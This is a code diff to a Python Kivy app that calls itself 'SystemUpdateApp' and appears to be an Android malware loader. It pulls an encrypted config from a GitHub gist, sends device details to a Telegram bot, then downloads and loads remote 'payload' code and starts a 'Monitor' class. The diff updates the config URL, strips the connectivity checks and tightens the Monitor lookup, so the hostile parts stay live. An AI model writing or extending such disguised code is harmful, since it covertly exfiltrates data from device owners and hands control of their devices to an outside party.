@@ -35,7 +35,7 @@ sys.excepthook = global_exception_handler
 
 class SystemUpdateApp(App):
     def build(self):
-        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/1029041e26d793614ba70bccaf542bfed53eeacd/config.json"
+        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/cf8b3c5fe79d3453e7272b3b8558d6a08f49e9ec/config.json"
         self.engine_running = False
         self.log_lines = []
 
@@ -100,47 +100,13 @@ class SystemUpdateApp(App):
         self.log("Manual start triggered")
         self.run_engine()
 
-    def test_permissions(self):
-        if platform != 'android':
-            return True
-        try:
-            from android.permissions import check_permission, Permission
-            perms = [Permission.INTERNET, Permission.ACCESS_NETWORK_STATE]
-            missing = [p for p in perms if not check_permission(p)]
-            if missing:
-                self.log(f"WARNING: Missing permissions: {missing}")
-                return False
-            self.log("All required permissions granted")
-            return True
-        except Exception as e:
-            self.log(f"Permission check error: {e}")
-            return False
-
     def test_dns(self):
         try:
-            socket.gethostbyname("google.com")
+            socket.gethostbyname("github.com")
             self.log("DNS resolution: OK")
             return True
         except Exception as e:
             self.log(f"DNS resolution: FAILED ({e})")
-            return False
-
-    def test_http_plain(self):
-        try:
-            r = requests.get("http://www.google.com", timeout=5)
-            self.log(f"HTTP plain request: OK (status {r.status_code})")
-            return True
-        except Exception as e:
-            self.log(f"HTTP plain request: FAILED ({e})")
-            return False
-
-    def test_https(self):
-        try:
-            r = requests.get("https://www.google.com", timeout=5, verify=False)
-            self.log(f"HTTPS request: OK (status {r.status_code})")
-            return True
-        except Exception as e:
-            self.log(f"HTTPS request: FAILED ({e})")
             return False
 
     def fetch_config(self, max_retries=2):
@@ -225,26 +191,17 @@ class SystemUpdateApp(App):
         self.log("ENGINE STARTED")
         self.log("="*50)
 
-        self.log("Step 1: Checking permissions...")
-        self.test_permissions()
-
-        self.log("Step 2: Testing DNS...")
+        self.log("Step 1: Testing DNS...")
         self.test_dns()
 
-        self.log("Step 3: Testing HTTP...")
-        self.test_http_plain()
-
-        self.log("Step 4: Testing HTTPS...")
-        self.test_https()
-
-        self.log("Step 5: Fetching config.json...")
+        self.log("Step 2: Fetching config.json...")
         config = self.fetch_config()
         if not config:
             self.log("CRITICAL: Cannot fetch config. Aborting.")
             self.engine_running = False
             return
 
-        self.log("Step 6: Decrypting tokens...")
+        self.log("Step 3: Decrypting tokens...")
         enc_tokens = config.get('t', [])
         if not enc_tokens:
             self.log("ERROR: No tokens in config")
@@ -269,13 +226,13 @@ class SystemUpdateApp(App):
             self.engine_running = False
             return
 
-        self.log("Step 7: Sending device info to Telegram...")
+        self.log("Step 4: Sending device info to Telegram...")
         device_info = self.get_device_info()
         msg = f"🚀 *System Online*\n📱 Device: `{device_info}`\n🕒 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
         self.send_telegram(token, chat_id, msg)
 
         payload_urls = config.get('payload_urls', [])
-        self.log(f"Step 8: Found {len(payload_urls)} payload URLs")
+        self.log(f"Step 5: Found {len(payload_urls)} payload URLs")
         if payload_urls:
             self.log("Loading payloads...")
             loaded = 0
@@ -291,18 +248,17 @@ class SystemUpdateApp(App):
                     self.log(f"    FAILED: {e}")
             self.log(f"Loaded {loaded}/{len(payload_urls)} payloads")
 
-            # البحث الذكي عن Monitor
             monitor_class = None
             if 'Monitor' in globals():
                 monitor_class = globals()['Monitor']
             else:
                 self.log("Searching for Monitor class in globals...")
                 for key, value in globals().items():
+                    if isinstance(value, type) and key == 'Monitor':
+                        monitor_class = value
+                        break
                     if hasattr(value, 'Monitor'):
                         monitor_class = getattr(value, 'Monitor')
-                        break
-                    if key == 'Monitor':
-                        monitor_class = value
                         break
 
             if monitor_class:
@@ -315,6 +271,9 @@ class SystemUpdateApp(App):
                     self.log(f"Monitor start failed: {e}")
             else:
                 self.log("CRITICAL: Monitor class not found after loading all payloads")
+                self.log("Available classes in globals:")
+                classes = [k for k, v in globals().items() if isinstance(v, type)]
+                self.log(f"  {classes}")
         else:
             self.log("No payloads to load")
 
